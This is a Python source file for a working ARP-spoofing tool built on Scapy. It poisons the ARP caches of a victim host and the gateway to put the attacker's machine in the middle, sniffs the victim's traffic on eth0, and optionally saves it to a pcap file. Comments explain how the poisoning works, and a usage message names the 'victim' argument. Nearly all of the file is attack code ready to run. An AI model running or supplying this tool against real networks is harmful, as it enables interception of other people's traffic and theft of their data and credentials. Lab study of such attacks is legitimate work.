from scapy.all import *
import pcapy
import sys
import os
import time
import scapy
import argparse
from IPy import IP
oFile="output.pcap"
writePcap=False

def restoreNormal(victimIP,routerIP):
	victimMAC = MACsnag(victimIP)
	routerMAC = MACsnag(routerIP)
	send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= victimMAC), count = 4,verbose=0)
	send(ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMAC), count = 4,verbose=0)

def MACsnag(IP):
    ans, unans = arping(IP)
    for s, r in ans:
        return r[Ether].src

def getDomainName(hostip):
	try:
		host = gethostbyaddr(hostip)
		hostName = nameorip = '{0} ({1})'.format(hostip , host[0])
	except Exception:
		hostName = '{0} (host name could not be determined)'.format(hostip)
	return hostName

def packetHandler(pkt):
	global writePcap
	#print("Hello")
	if(writePcap):
		#print("Appending")
		wrpcap(oFile, pkt,append=True)
	else:
		#modify to support filtering on this later
		print(pkt)


def sniffer():
	try:
		pkts = sniff(iface = "eth0",prn=packetHandler)
	except Exception as e:
		print("Exception occurred during sniffing",e)




def Spoof(routerIP, victimIP):
	victimMAC = MACsnag(victimIP)
	routerMAC = MACsnag(routerIP)

	#print("Target is at ",victimMAC)
	#print("Gateway is at ",routerMAC)
	#See desktop image for arp opcodes op=opcode(Size is short enum field)
	#op=1 stands for arp request, arp=2 stands for arp reply
	#Instead of op = 1 we could also use op="who-has" as a form of Arp request
	#Arp message format http://www.tcpipguide.com/free/t_ARPMessageFormat.htm,
	#img @ http://www.tcpipguide.com/free/diagrams/arpformat.png
	'''
	Arp has no way of checking that the ARP reply being sent was asked for or not
	It will update the arp cache of the router and victim Machine
	Note that hwsrc has been left blank, that means that will be our mac address
	Our mac address will be mapped to victim Ip in router's arp cache
	And in victim's arp cache it will be mapped to router's IP, placing us in the middle
	'''
	#Poisoning the arp cache of victim
	#Telling the victim that the router's IP belongs to the mac address of our machine
	send(ARP(op =2, pdst = victimIP, psrc = routerIP, hwdst = victimMAC),verbose=0)
	#Poisoning arp cache of router
	#Telling the router that ip address of the victim belongs to us
	send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = routerMAC),verbose=0)

def usage():
	str1="Arpspoof script to arpspoof a host. Must be on the same network as the victim(S). Enter the routerIp as python arpspoof.py <routerIp> <victimIp>"
	str2="The Ip address fields expects Ipv4 addresses"
	str3="Usage eg: python arpspoof.py 192.168.1.1 192.168.1.5"
	str4="Here the first option provided is the routerIp and the second one is the victimIp"
	print(str1)
	print(str2)
	print(str3)
	print(str4)

def finalattack():
	#Write code for argument parsing
	print("Parsing arguments.....")
	str1="Arpspoof script to arpspoof a host. Must be on the same network as the victim(S)\n Enter the routerIp as python arpspoof.py <routerIp> <victimIp>"
	parser = argparse.ArgumentParser(description=str1)

	try:
		parser.add_argument("router", type=str, help="this is the router ip or gateway Ip address, string expected")
		parser.add_argument("victim", type=str, help="This is the victim ip , string expected")
		parser.add_argument("-w", "--write",help="Write to a file",default=False,action="store_true")
		parser.add_argument("-o","--outputfile", default="output.pcap",type=str,help="When -w is used , it writes to a file specified by value. Ignored if -w is unset")
		args = parser.parse_args()
		IP(args.router)
		IP(args.victim)
		print(args.write)
	except BaseException as b:
		print("Exception occurred during parsing argument , use -help or --help for seeing usage")
		print(b)
		usage()

		sys.exit(0)
	if args.write:
		global writePcap
		global oFile
		if os.path.isfile('./'+args.outputfile):
			os.remove(args.outputfile)
		writePcap=True
		oFile=args.outputfile




	print("Initiating arpspoof on the provided Ip, Use Ctrl-C to interrupt and restore normal flow")
	while 1:
		try:
			Spoof(args.router,args.victim)
			time.sleep(1)
			sniffer()
		except KeyboardInterrupt:
			print("Keyboard interrupt detected....")
			print("Restoring arp entries")
			restoreNormal(args.victim,args.router)
			print("Arp entries restored")
			sys.exit(1)



if __name__ == "__main__":
    finalattack()
